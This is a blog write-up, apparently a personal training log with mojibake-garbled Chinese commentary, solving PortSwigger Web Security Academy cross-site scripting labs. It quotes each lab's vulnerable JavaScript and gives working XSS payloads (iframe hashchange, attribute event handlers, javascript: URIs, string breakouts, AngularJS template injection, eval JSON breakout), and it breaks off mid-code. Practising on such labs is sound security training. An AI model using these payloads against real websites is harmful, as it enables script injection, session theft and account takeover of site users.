<!doctype html><html class=scroll-smooth lang=en><head><meta charset=utf-8><link href=/css/style.css rel=stylesheet><link href=/line-awesome/css/line-awesome.min.css rel=stylesheet><script defer src=/js/main.js></script><title>Portswigger Web lab writeup: Cross-site scripting | Random thoughts here</title><body class="bg-white dark:bg-slate-900 transition ease-in-out"><section><div class="sticky top-0 bg-slate-100 dark:bg-slate-800"><div class="container mx-auto flex place-content-between py-16 lg:py-8 font-sans text-6xl lg:text-2xl text-slate-900 dark:text-slate-300"><div class=flex><a class="m-0 p-0 text-slate-900 hover:text-slate-700 dark:text-slate-300 dark:hover:text-slate-200" href=/blog/> /blog </a></div><div class="flex gap-4"><div class="hidden cursor-pointer" id=back-to-top><i class="las la-level-up-alt"></i></div><a href=/><i class="las la-home"></i></a><div class=cursor-pointer id=darkmode-toggle><div class="hidden dark:inline"><i class="las la-sun"></i></div><div class="inline dark:hidden"><i class="las la-moon"></i></div></div></div></div></div><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><script type=text/x-mathjax-config>
      MathJax.Hub.Config({
        tex2jax: {inlineMath: [['$','$']]}
      });
    </script><div class="container mb-16"><div class="mt-4 font-serif text-slate-600 dark:text-slate-500 text-4xl lg:text-base">2023-08-29</div><h1 class="w-full mt-4 mb-8 font-serif text-8xl lg:text-4xl text-slate-900 dark:text-slate-300">Portswigger Web lab writeup: Cross-site scripting</h1><div class="w-100 border-t mb-8 border-slate-300 dark:border-slate-700"></div><div class=prose-boring><p><em>å‰é¢è¿˜æœ‰å‡ é“ä»¥å‰åšçš„ æ¯•ç«Ÿç®€å•ä¸æ˜¯å¾ˆæœ‰å¿…è¦é‡æ–°è®°å½•</em><h2 id=lab-dom-xss-in-jquery-selector-sink-using-a-hashchange-event>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>DOM XSS</a> in jQuery selector sink using a hashchange event</h2><p>JQuery:<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#88c0d0>$</span><span>(window)</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>on</span><span>(</span><span style=color:#a3be8c>'hashchange'</span><span style=color:#eceff4>, </span><span style=color:#81a1c1>function</span><span>(){
</span><span>                            </span><span style=color:#81a1c1>var </span><span>post </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>$</span><span>(</span><span style=color:#a3be8c>'section.blog-list h2:contains(' </span><span style=color:#81a1c1>+ </span><span style=color:#88c0d0>decodeURIComponent</span><span>(window</span><span style=color:#81a1c1>.</span><span>location</span><span style=color:#81a1c1>.</span><span>hash</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>slice</span><span>(</span><span style=color:#b48ead>1</span><span>)) </span><span style=color:#81a1c1>+ </span><span style=color:#a3be8c>')'</span><span>)</span><span style=color:#eceff4>;
</span><span>                            </span><span style=color:#81a1c1>if </span><span>(post) post</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>get</span><span>(</span><span style=color:#b48ead>0</span><span>)</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>scrollIntoView</span><span>()</span><span style=color:#eceff4>;
</span><span>                        })</span><span style=color:#eceff4>;
</span></code></pre><p>å½“ URL çš„ç‰‡æ®µæ ‡è¯†ç¬¦æ›´æ”¹æ—¶ï¼Œå°†è§¦å‘<strong>hashchange</strong>äº‹ä»¶ï¼Œä¼ é€’åˆ° Jquery é€‰æ‹©å™¨ï¼Œé€‰æ‹©åˆ° h2 ä¸­ å­˜åœ¨ <code>decodeURIComponent(window.location.hash.slice(1))</code> çš„å…ƒç´ ï¼ˆè‡ªç„¶æ˜¯ä¸å­˜åœ¨ï¼‰ã€‚ç„¶å<code>scrollIntoView()</code>ä½¿ç”¨æˆ·å¯è§ã€‚<p>å› è€Œ payload è¦è§¦å‘ haschange äº‹ä»¶ã€‚<pre class=language-html data-lang=html style=color:#d8dee9;background-color:#2e3440><code class=language-html data-lang=html><span style=color:#81a1c1>&LTiframe </span><span style=color:#8fbcbb>src</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"https://YOUR-LAB-ID.web-security-academy.net/#" </span><span style=color:#8fbcbb>onload</span><span style=color:#eceff4>=</span><span style=color:#a3be8c>"</span><span style=color:#81a1c1>this.</span><span style=color:#eceff4>src</span><span style=color:#81a1c1>+=</span><span style=color:#a3be8c>'&LTimg src=x onerror=print()>'"</span><span style=color:#81a1c1>>&LT/iframe>
</span></code></pre><h2 id=lab-reflected-xss-into-attribute-with-angle-brackets-html-encoded>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> into attribute with angle brackets HTML-encoded</h2><p>å±æ€§æ³¨å…¥ã€‚è¿™ä¸ªæˆ‘ç†Ÿ<p>æŸ¥é˜… https://portswigger.net/web-security/cross-site-scripting/cheat-sheet<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#a3be8c>" autofocus onfocusin=alert(window.origin) b="
</span></code></pre><h2 id=lab-stored-xss-into-anchor-href-attribute-with-double-quotes-html-encoded>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/stored>Stored XSS</a> into anchor <code>href</code> attribute with double quotes HTML-encoded</h2><p>è¦å®ç°ç‚¹å‡»åå­—çš„æ—¶å€™alertï¼Œæµ‹è¯•å‘ç°ç‚¹å‡»è·³è½¬åˆ°å¡«å…¥çš„websiteã€‚jsä¼ªåè®®ç›´æ¥è¿‡<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#5e81ac>javascript</span><span style=color:#eceff4>:</span><span style=color:#88c0d0>alert</span><span>(window</span><span style=color:#81a1c1>.</span><span>origin)
</span></code></pre><p>ä¹Ÿå°±æ˜¯a.hrefçš„æ»¥ç”¨<h2 id=lab-reflected-xss-into-a-javascript-string-with-angle-brackets-html-encoded>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/reflected>Reflected XSS</a> into a JavaScript string with angle brackets HTML encoded</h2><pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span> </span><span style=color:#81a1c1>var </span><span>searchTerms </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>'searchå‚æ•°'</span><span style=color:#eceff4>;
</span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LTimg src="/resources/images/tracker.gif?searchTerms='</span><span style=color:#81a1c1>+</span><span style=color:#88c0d0>encodeURIComponent</span><span>(searchTerms)</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>'">'</span><span>)</span><span style=color:#eceff4>;
</span></code></pre><p>JSçš„å†…å®¹ç›´æ¥æ¥æºäºå‚æ•°ï¼Œåº”è¯¥æ˜¯åšäº†å•¥æ¨¡æ¿æ¸²æŸ“çš„ã€‚æ³¨å…¥jsä»£ç <pre style=color:#d8dee9;background-color:#2e3440><code><span>%27;%0aalert(window.origin);%0ab='
</span></code></pre><h2 id=lab-dom-xss-in-document-write-sink-using-source-location-search-inside-a-select>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>DOM XSS</a> in <code>document.write</code> sink using source <code>location.search</code> inside a select</h2><pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>var </span><span>stores </span><span style=color:#81a1c1>= </span><span>[</span><span style=color:#a3be8c>"London"</span><span style=color:#eceff4>,</span><span style=color:#a3be8c>"Paris"</span><span style=color:#eceff4>,</span><span style=color:#a3be8c>"Milan"</span><span>]</span><span style=color:#eceff4>;
</span><span style=color:#81a1c1>var </span><span>store </span><span style=color:#81a1c1>= </span><span>(</span><span style=color:#81a1c1>new </span><span style=color:#8fbcbb>URLSearchParams</span><span>(window</span><span style=color:#81a1c1>.</span><span>location</span><span style=color:#81a1c1>.</span><span>search))</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>get</span><span>(</span><span style=color:#a3be8c>'storeId'</span><span>)</span><span style=color:#eceff4>;
</span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LTselect name="storeId">'</span><span>)</span><span style=color:#eceff4>;
</span><span style=color:#81a1c1>if</span><span>(store) {
</span><span>    document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LToption selected>'</span><span style=color:#81a1c1>+</span><span>store</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>'&LT/option>'</span><span>)</span><span style=color:#eceff4>;
</span><span>}
</span><span style=color:#81a1c1>for</span><span>(</span><span style=color:#81a1c1>var </span><span>i</span><span style=color:#81a1c1>=</span><span style=color:#b48ead>0</span><span style=color:#eceff4>;</span><span>i</span><span style=color:#81a1c1><</span><span>stores</span><span style=color:#81a1c1>.</span><span>length</span><span style=color:#eceff4>;</span><span>i</span><span style=color:#81a1c1>++</span><span>) {
</span><span>    </span><span style=color:#81a1c1>if</span><span>(stores[i] </span><span style=color:#81a1c1>=== </span><span>store) {
</span><span>        </span><span style=color:#81a1c1>continue</span><span style=color:#eceff4>;
</span><span>    }
</span><span>    document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LToption>'</span><span style=color:#81a1c1>+</span><span>stores[i]</span><span style=color:#81a1c1>+</span><span style=color:#a3be8c>'&LT/option>'</span><span>)</span><span style=color:#eceff4>;
</span><span>}
</span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>write</span><span>(</span><span style=color:#a3be8c>'&LT/select>'</span><span>)</span><span style=color:#eceff4>;
</span></code></pre><p>ç›´æ¥Inject<pre style=color:#d8dee9;background-color:#2e3440><code><span>/product?productId=1&storeId=&LTscript>alert(window.origin)&LT/script>
</span></code></pre><h2 id=lab-dom-xss-in-angularjs-expression-with-angle-brackets-and-double-quotes-html-encoded>Lab: <a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>DOM XSS</a> in AngularJS expression with angle brackets and double quotes HTML-encoded</h2><p>urlå‚æ•°åœ¨<code>><</code>ä¸­é—´ï¼Œå°–æ‹¬å·è½¬ä¹‰ã€‚æ— æ³•é€ƒå‡º<p>è€Œç”±äºAngularJSçš„å¼•å…¥ï¼Œå¯ä»¥ CSTI<pre style=color:#d8dee9;background-color:#2e3440><code><span>{{$on.constructor('alert(window.origin)')()}}
</span></code></pre><p>å¦å¤– AngularJS gadget (SSTI)è¿˜å¯ä»¥ç”¨æ¥ bypass CSP ã€‚payload æ”¶é›†ï¼šhttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md ä»¥åŠ https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected<h2 id=lab-reflected-dom-xss>Lab: Reflected <a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>DOM XSS</a></h2><pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>function </span><span style=color:#88c0d0>search</span><span>(path) {
</span><span>    </span><span style=color:#81a1c1>var </span><span>xhr </span><span style=color:#81a1c1>= new </span><span style=color:#8fbcbb>XMLHttpRequest</span><span>()</span><span style=color:#eceff4>;
</span><span>    xhr</span><span style=color:#81a1c1>.</span><span>onreadystatechange </span><span style=color:#81a1c1>= function</span><span>() {
</span><span>        </span><span style=color:#81a1c1>if </span><span>(</span><span style=color:#81a1c1>this.</span><span>readyState </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>4 </span><span style=color:#81a1c1>&& this.</span><span>status </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>200</span><span>) {
</span><span>            </span><span style=color:#88c0d0>eval</span><span>(</span><span style=color:#a3be8c>'var searchResultsObj = ' </span><span style=color:#81a1c1>+ this.</span><span>responseText)</span><span style=color:#eceff4>;
</span><span>            </span><span style=color:#88c0d0>displaySearchResults</span><span>(searchResultsObj)</span><span style=color:#eceff4>;
</span><span>        }
</span><span>    }</span><span style=color:#eceff4>;
</span><span>    xhr</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>open</span><span>(</span><span style=color:#a3be8c>"GET"</span><span style=color:#eceff4>, </span><span>path </span><span style=color:#81a1c1>+ </span><span>window</span><span style=color:#81a1c1>.</span><span>location</span><span style=color:#81a1c1>.</span><span>search)</span><span style=color:#eceff4>;
</span><span>    xhr</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>send</span><span>()</span><span style=color:#eceff4>;
</span><span>
</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>displaySearchResults</span><span>(searchResultsObj) {
</span><span>        </span><span style=color:#81a1c1>var </span><span>blogHeader </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getElementsByClassName</span><span>(</span><span style=color:#a3be8c>"blog-header"</span><span>)[</span><span style=color:#b48ead>0</span><span>]</span><span style=color:#eceff4>;
</span><span>        </span><span style=color:#81a1c1>var </span><span>blogList </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getElementsByClassName</span><span>(</span><span style=color:#a3be8c>"blog-list"</span><span>)[</span><span style=color:#b48ead>0</span><span>]</span><span style=color:#eceff4>;
</span><span>        </span><span style=color:#81a1c1>var </span><span>searchTerm </span><span style=color:#81a1c1>= </span><span>searchResultsObj</span><span style=color:#81a1c1>.</span><span>searchTerm
</span><span>        </span><span style=color:#81a1c1>var </span><span>searchResults </span><span style=color:#81a1c1>= </span><span>searchResultsObj</span><span style=color:#81a1c1>.</span><span>results
</span><span>
</span><span>        </span><span style=color:#81a1c1>var </span><span>h1 </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"h1"</span><span>)</span><span style=color:#eceff4>;
</span><span>        h1</span><span style=color:#81a1c1>.</span><span>innerText </span><span style=color:#81a1c1>= </span><span>searchResults</span><span style=color:#81a1c1>.</span><span>length </span><span style=color:#81a1c1>+ </span><span style=color:#a3be8c>" search results for '" </span><span style=color:#81a1c1>+ </span><span>searchTerm </span><span style=color:#81a1c1>+ </span><span style=color:#a3be8c>"'"</span><span style=color:#eceff4>;
</span><span>        blogHeader</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(h1)</span><span style=color:#eceff4>;
</span><span>        </span><span style=color:#81a1c1>var </span><span>hr </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"hr"</span><span>)</span><span style=color:#eceff4>;
</span><span>        blogHeader</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(hr)
</span><span>
</span><span>        </span><span style=color:#81a1c1>for </span><span>(</span><span style=color:#81a1c1>var </span><span>i </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>0</span><span style=color:#eceff4>; </span><span>i </span><span style=color:#81a1c1>< </span><span>searchResults</span><span style=color:#81a1c1>.</span><span>length</span><span style=color:#eceff4>; </span><span style=color:#81a1c1>++</span><span>i)
</span><span>        {
</span><span>            </span><span style=color:#81a1c1>var </span><span>searchResult </span><span style=color:#81a1c1>= </span><span>searchResults[i]</span><span style=color:#eceff4>;
</span><span>            </span><span style=color:#81a1c1>if </span><span>(searchResult</span><span style=color:#81a1c1>.</span><span>id) {
</span><span>                </span><span style=color:#81a1c1>var </span><span>blogLink </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"a"</span><span>)</span><span style=color:#eceff4>;
</span><span>                blogLink</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"href"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"/post?postId=" </span><span style=color:#81a1c1>+ </span><span>searchResult</span><span style=color:#81a1c1>.</span><span>id)</span><span style=color:#eceff4>;
</span><span>
</span><span>                </span><span style=color:#81a1c1>if </span><span>(searchResult</span><span style=color:#81a1c1>.</span><span>headerImage) {
</span><span>                    </span><span style=color:#81a1c1>var </span><span>headerImage </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"img"</span><span>)</span><span style=color:#eceff4>;
</span><span>                    headerImage</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"src"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"/image/" </span><span style=color:#81a1c1>+ </span><span>searchResult</span><span style=color:#81a1c1>.</span><span>headerImage)</span><span style=color:#eceff4>;
</span><span>                    blogLink</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(headerImage)</span><span style=color:#eceff4>;
</span><span>                }
</span><span>
</span><span>                blogList</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(blogLink)</span><span style=color:#eceff4>;
</span><span>            }
</span><span>
</span><span>            blogList</span><span style=color:#81a1c1>.</span><span>innerHTML </span><span style=color:#81a1c1>+= </span><span style=color:#a3be8c>"&LTbr/>"</span><span style=color:#eceff4>;
</span><span>
</span><span>            </span><span style=color:#81a1c1>if </span><span>(searchResult</span><span style=color:#81a1c1>.</span><span>title) {
</span><span>                </span><span style=color:#81a1c1>var </span><span>title </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"h2"</span><span>)</span><span style=color:#eceff4>;
</span><span>                title</span><span style=color:#81a1c1>.</span><span>innerText </span><span style=color:#81a1c1>= </span><span>searchResult</span><span style=color:#81a1c1>.</span><span>title</span><span style=color:#eceff4>;
</span><span>                blogList</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(title)</span><span style=color:#eceff4>;
</span><span>            }
</span><span>
</span><span>            </span><span style=color:#81a1c1>if </span><span>(searchResult</span><span style=color:#81a1c1>.</span><span>summary) {
</span><span>                </span><span style=color:#81a1c1>var </span><span>summary </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"p"</span><span>)</span><span style=color:#eceff4>;
</span><span>                summary</span><span style=color:#81a1c1>.</span><span>innerText </span><span style=color:#81a1c1>= </span><span>searchResult</span><span style=color:#81a1c1>.</span><span>summary</span><span style=color:#eceff4>;
</span><span>                blogList</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(summary)</span><span style=color:#eceff4>;
</span><span>            }
</span><span>
</span><span>            </span><span style=color:#81a1c1>if </span><span>(searchResult</span><span style=color:#81a1c1>.</span><span>id) {
</span><span>                </span><span style=color:#81a1c1>var </span><span>viewPostButton </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"a"</span><span>)</span><span style=color:#eceff4>;
</span><span>                viewPostButton</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"class"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"button is-small"</span><span>)</span><span style=color:#eceff4>;
</span><span>                viewPostButton</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"href"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"/post?postId=" </span><span style=color:#81a1c1>+ </span><span>searchResult</span><span style=color:#81a1c1>.</span><span>id)</span><span style=color:#eceff4>;
</span><span>                viewPostButton</span><span style=color:#81a1c1>.</span><span>innerText </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>"View post"</span><span style=color:#eceff4>;
</span><span>            }
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#81a1c1>var </span><span>linkback </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"div"</span><span>)</span><span style=color:#eceff4>;
</span><span>        linkback</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"class"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"is-linkback"</span><span>)</span><span style=color:#eceff4>;
</span><span>        </span><span style=color:#81a1c1>var </span><span>backToBlog </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"a"</span><span>)</span><span style=color:#eceff4>;
</span><span>        backToBlog</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"href"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"/"</span><span>)</span><span style=color:#eceff4>;
</span><span>        backToBlog</span><span style=color:#81a1c1>.</span><span>innerText </span><span style=color:#81a1c1>= </span><span style=color:#a3be8c>"Back to Blog"</span><span style=color:#eceff4>;
</span><span>        linkback</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(backToBlog)</span><span style=color:#eceff4>;
</span><span>        blogList</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(linkback)</span><span style=color:#eceff4>;
</span><span>    }
</span><span>}
</span></code></pre><p>è°ƒç”¨äº†<code>/search-results?search=123</code>çš„ api åšäº†ä¸€ä¸ª ajax (åº”è¯¥ç®—æ˜¯å§)ã€‚è„šæœ¬ä¸­ç›´æ¥æ‹¼æ¥ responseText evaläº†ï¼Œå¦‚æœ api å¯ä»¥æ³¨å…¥é‚£å°±å¯ä»¥å®ç° alertã€‚<p>æµ‹è¯•å‘ç° api çš„è½¬ä¹‰ç­–ç•¥æœ‰é—®é¢˜ï¼Œè¾“å…¥<code>\"</code>è¿”å›å°±ä¸æ˜¯åˆæ³• json äº†ï¼Œescape æ‰äº†ä¸€ä¸ªå¼•å·<p>æ„é€ åˆæ³• json<pre style=color:#d8dee9;background-color:#2e3440><code><span>\"-alert(window.origin)}//
</span></code></pre><p>ç”±äºè¿™ä¸ª<code>-</code>ä»…ä»…æ˜¯è®¡ç®—ç¬¦å·ï¼Œæ”¹æˆ<code>*</code>æˆ–<code>/</code>éƒ½è¡Œã€‚è€Œ<code>+</code>å› ä¸ºä¼šè¢« http åè®®è®¤ä½œç©ºæ ¼æ‰€ä»¥ä¸èƒ½æ­£å¸¸åˆ©ç”¨ã€‚æ”¹æˆ<code>%2B</code>å°±å¯ä»¥äº†<pre style=color:#d8dee9;background-color:#2e3440><code><span>\"%2Balert()}//
</span></code></pre><h2 id=lab-stored-dom-xss>Lab: Stored <a href=https://portswigger.net/web-security/cross-site-scripting/dom-based>DOM XSS</a></h2><p>éšä¾¿ç‚¹ä¸€ä¸ªæ–‡ç« <code>Ctrl + U</code>å¯ä»¥çœ‹åˆ°æ²¡æœ‰è¯„è®ºã€‚å¯ä»¥åˆ¤æ–­ä¸ºå‰ç«¯æ¸²æŸ“<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>function </span><span style=color:#88c0d0>loadComments</span><span>(postCommentPath) {
</span><span>    </span><span style=color:#81a1c1>let </span><span>xhr </span><span style=color:#81a1c1>= new </span><span style=color:#8fbcbb>XMLHttpRequest</span><span>()</span><span style=color:#eceff4>;
</span><span>    xhr</span><span style=color:#81a1c1>.</span><span>onreadystatechange </span><span style=color:#81a1c1>= function</span><span>() {
</span><span>        </span><span style=color:#81a1c1>if </span><span>(</span><span style=color:#81a1c1>this.</span><span>readyState </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>4 </span><span style=color:#81a1c1>&& this.</span><span>status </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>200</span><span>) {
</span><span>            </span><span style=color:#81a1c1>let </span><span>comments </span><span style=color:#81a1c1>= </span><span style=color:#8fbcbb>JSON</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>parse</span><span>(</span><span style=color:#81a1c1>this.</span><span>responseText)</span><span style=color:#eceff4>;
</span><span>            </span><span style=color:#88c0d0>displayComments</span><span>(comments)</span><span style=color:#eceff4>;
</span><span>        }
</span><span>    }</span><span style=color:#eceff4>;
</span><span>    xhr</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>open</span><span>(</span><span style=color:#a3be8c>"GET"</span><span style=color:#eceff4>, </span><span>postCommentPath </span><span style=color:#81a1c1>+ </span><span>window</span><span style=color:#81a1c1>.</span><span>location</span><span style=color:#81a1c1>.</span><span>search)</span><span style=color:#eceff4>;
</span><span>    xhr</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>send</span><span>()</span><span style=color:#eceff4>;
</span><span>
</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>escapeHTML</span><span>(html) {
</span><span>        </span><span style=color:#81a1c1>return </span><span>html</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>replace</span><span>(</span><span style=color:#a3be8c>'<'</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>'&amplt;'</span><span>)</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>replace</span><span>(</span><span style=color:#a3be8c>'>'</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>'&ampgt;'</span><span>)</span><span style=color:#eceff4>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#81a1c1>function </span><span style=color:#88c0d0>displayComments</span><span>(comments) {
</span><span>        </span><span style=color:#81a1c1>let </span><span>userComments </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getElementById</span><span>(</span><span style=color:#a3be8c>"user-comments"</span><span>)</span><span style=color:#eceff4>;
</span><span>
</span><span>        </span><span style=color:#81a1c1>for </span><span>(</span><span style=color:#81a1c1>let </span><span>i </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>0</span><span style=color:#eceff4>; </span><span>i </span><span style=color:#81a1c1>< </span><span>comments</span><span style=color:#81a1c1>.</span><span>length</span><span style=color:#eceff4>; </span><span style=color:#81a1c1>++</span><span>i)
</span><span>        {
</span><span>            comment </span><span style=color:#81a1c1>= </span><span>comments[i]</span><span style=color:#eceff4>;
</span><span>            </span><span style=color:#81a1c1>let </span><span>commentSection </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"section"</span><span>)</span><span style=color:#eceff4>;
</span><span>            commentSection</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"class"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"comment"</span><span>)</span><span style=color:#eceff4>;
</span><span>
</span><span>            </span><span style=color:#81a1c1>let </span><span>firstPElement </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"p"</span><span>)</span><span style=color:#eceff4>;
</span><span>
</span><span>            </span><span style=color:#81a1c1>let </span><span>avatarImgElement </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"img"</span><span>)</span><span style=color:#eceff4>;
</span><span>            avatarImgElement</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"class"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"avatar"</span><span>)</span><span style=color:#eceff4>;
</span><span>            avatarImgElement</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"src"</span><span style=color:#eceff4>, </span><span>comment</span><span style=color:#81a1c1>.</span><span>avatar </span><span style=color:#81a1c1>? </span><span style=color:#88c0d0>escapeHTML</span><span>(comment</span><span style=color:#81a1c1>.</span><span>avatar) </span><span style=color:#81a1c1>: </span><span style=color:#a3be8c>"/resources/images/avatarDefault.svg"</span><span>)</span><span style=color:#eceff4>;
</span><span>
</span><span>            </span><span style=color:#81a1c1>if </span><span>(comment</span><span style=color:#81a1c1>.</span><span>author) {
</span><span>                </span><span style=color:#81a1c1>if </span><span>(comment</span><span style=color:#81a1c1>.</span><span>website) {
</span><span>                    </span><span style=color:#81a1c1>let </span><span>websiteElement </span><span style=color:#81a1c1>= </span><span>document</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>createElement</span><span>(</span><span style=color:#a3be8c>"a"</span><span>)</span><span style=color:#eceff4>;
</span><span>                    websiteElement</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"id"</span><span style=color:#eceff4>, </span><span style=color:#a3be8c>"author"</span><span>)</span><span style=color:#eceff4>;
</span><span>                    websiteElement</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>setAttribute</span><span>(</span><span style=color:#a3be8c>"href"</span><span style=color:#eceff4>, </span><span>comment</span><span style=color:#81a1c1>.</span><span>website)</span><span style=color:#eceff4>;
</span><span>                    firstPElement</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>appendChild</span><span>(websiteElement)
</span><span>                }
</span><span>
